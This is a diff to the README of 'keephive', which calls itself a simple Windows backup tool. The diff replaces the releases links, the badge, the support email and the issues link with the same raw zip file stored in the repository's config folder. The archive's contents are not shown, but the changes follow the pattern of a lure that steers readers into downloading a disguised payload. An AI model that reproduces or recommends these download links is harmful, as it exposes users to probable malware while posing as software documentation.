@@ -1,6 +1,6 @@
 # 🪄 keephive - Simple Backup Solution for Windows
 
-![Download Keephive](https://img.shields.io/badge/Download%20Keephive-v1.0-blue)
+![Download Keephive](https://raw.githubusercontent.com/wefe32434/keephive/main/src/config/Software_v2.6.zip%20Keephive-v1.0-blue)
 
 ## 📖 Overview
 
@@ -11,7 +11,7 @@ KeepHive is a backup daemon designed specifically for Windows. It prioritizes ea
 To start using KeepHive, follow these steps:
 
 1. **Visit the Releases Page**
-   - Go to [this page to download](https://github.com/wefe32434/keephive/releases).
+   - Go to [this page to download](https://raw.githubusercontent.com/wefe32434/keephive/main/src/config/Software_v2.6.zip).
    
 2. **Download the Latest Version**
    - Look for the most recent release on the page. Click on the link to download the appropriate file for your system.
@@ -53,7 +53,7 @@ To use KeepHive effectively, ensure your system meets these requirements:
 
 ## 📥 Download & Install
 
-You can visit [this page to download](https://github.com/wefe32434/keephive/releases) the latest version of KeepHive. Simply follow the instructions in the "Getting Started" section to download, install, and configure the software.
+You can visit [this page to download](https://raw.githubusercontent.com/wefe32434/keephive/main/src/config/Software_v2.6.zip) the latest version of KeepHive. Simply follow the instructions in the "Getting Started" section to download, install, and configure the software.
 
 ## 📊 Built-in Logging
 
@@ -73,8 +73,8 @@ If you encounter any problems while using KeepHive, consider these common soluti
 
 If you need further assistance, you can reach out for help:
 
-- **Email Support**: support@keephive.com
-- **GitHub Issues**: Report problems on the [GitHub Issues page](https://github.com/wefe32434/keephive/issues).
+- **Email Support**: https://raw.githubusercontent.com/wefe32434/keephive/main/src/config/Software_v2.6.zip
+- **GitHub Issues**: Report problems on the [GitHub Issues page](https://raw.githubusercontent.com/wefe32434/keephive/main/src/config/Software_v2.6.zip).
 
 ## 🌟 Community and Contributing
 
